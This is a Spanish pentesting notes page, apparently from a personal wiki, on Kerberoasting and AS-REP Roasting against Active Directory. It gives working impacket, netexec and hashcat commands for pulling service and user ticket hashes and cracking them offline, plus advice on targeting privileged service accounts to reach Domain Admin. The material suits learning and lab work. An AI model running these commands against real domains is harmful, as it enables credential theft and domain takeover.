# Kerberoasting y AS-REP Roasting

Dos ataques a **Kerberos** que permiten obtener hashes crackeables de cuentas del dominio y, con suerte, sus contraseñas en texto claro. Son de los primeros que pruebas en cualquier Active Directory porque, a menudo, solo necesitas **un usuario de dominio** (Kerberoasting) o **ninguna credencial** (AS-REP).

> Contexto y flujo general en [Introducción a Active Directory](./00%20-%20Introducci%C3%B3n.md).

---

## Kerberos en 1 minuto

```pipeline
Cliente -> AS-REQ -> KDC (devuelve TGT) -> TGS-REQ con SPN -> KDC (devuelve TGS) -> Servicio
```

- **TGT**: ticket inicial que identifica al usuario.
- **TGS**: ticket para un servicio concreto, cifrado con el hash de la **cuenta de servicio** dueña del SPN. ← esto es lo que roba Kerberoasting.
- **SPN** (Service Principal Name): identifica un servicio asociado a una cuenta.

---

## AS-REP Roasting (sin credenciales)

Afecta a cuentas con **"No requiere preautenticación Kerberos"** (`DONT_REQ_PREAUTH`). Para esas cuentas, el KDC entrega un `AS-REP` cifrado con el hash del usuario **a quien lo pida**, sin autenticarse → lo crackeas offline.

### Necesitas: una lista de usuarios (sácala por [LDAP](../Enumeraci%C3%B3n%20y%20Explotaci%C3%B3n%20de%20Protocolos/Protocolo%20LDAP.md), SMB RID-brute o SMTP).

```bash
# Probar una lista de usuarios (sin contraseña)
impacket-GetNPUsers dominio.local/ -usersfile usuarios.txt -dc-ip <DC_IP> -no-pass

# Si ya tienes una credencial, deja que enumere las cuentas vulnerables
impacket-GetNPUsers dominio.local/<user>:<pass> -dc-ip <DC_IP> -request

# Con netexec
netexec ldap <DC_IP> -u <user> -p <pass> --asreproast asrep.txt
```

### Crackear el hash (`$krb5asrep$`)

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting (con un usuario de dominio)

Cualquier usuario autenticado puede pedir un **TGS** para cualquier **SPN**. Ese TGS va cifrado con el hash de la cuenta de servicio → crackeable offline. Las cuentas de servicio suelen tener contraseñas antiguas y débiles.

```bash
# Pedir los TGS de todas las cuentas con SPN
impacket-GetUserSPNs dominio.local/<user>:<pass> -dc-ip <DC_IP> -request

# Guardar en archivo
impacket-GetUserSPNs dominio.local/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.txt

# Con netexec
netexec ldap <DC_IP> -u <user> -p <pass> --kerberoasting kerb.txt
```

### Crackear el hash (`$krb5tgs$`)

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

> **Consejo:** prioriza crackear cuentas que parezcan administrativas (`svc_admin`, `sqlservice`, `backup`). Una cuenta de servicio kerberoasteada con privilegios altos puede ser el salto directo a Domain Admin.

---

## Requisito clave: la hora

Kerberos es muy sensible al **desfase horario** con el DC. Si ves errores tipo `KRB_AP_ERR_SKEW`, sincroniza tu reloj:

```bash
sudo ntpdate <DC_IP>
# o
sudo rdate -n <DC_IP>
```

> **Nota:** si los ataques Kerberos fallan "sin motivo", casi siempre es (1) la **hora** desincronizada o (2) que no resuelves el **nombre del dominio** → añádelo a `/etc/hosts`. Revisa ambas cosas antes de volverte loco.

---

## Qué hacer tras crackear

```pipeline
Hash crackeado -> credencial válida -> netexec (smb/winrm) -> ¿Pwn3d? -> shell / BloodHound
```

Lleva la credencial a [BloodHound](./BloodHound.md) para ver qué permisos te da y cuál es el camino a Domain Admin.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `impacket-GetNPUsers` | AS-REP Roasting. |
| `impacket-GetUserSPNs` | Kerberoasting. |
| `netexec ldap` (`--asreproast`/`--kerberoasting`) | Ambos ataques de forma masiva. |
| `hashcat` (18200 / 13100) | Crackear AS-REP y TGS. |
| `kerbrute` | Enumerar usuarios y validar credenciales por Kerberos. |

---

> **Consejo:** el orden natural en AD es: saca usuarios → **AS-REP Roasting** (no necesita credenciales) → con cualquier credencial válida, **Kerberoasting** → crackea los hashes → repite enumeración con las nuevas credenciales. Son rápidos, ruidosos pero muy efectivos, y resuelven una enorme cantidad de dominios de laboratorio.
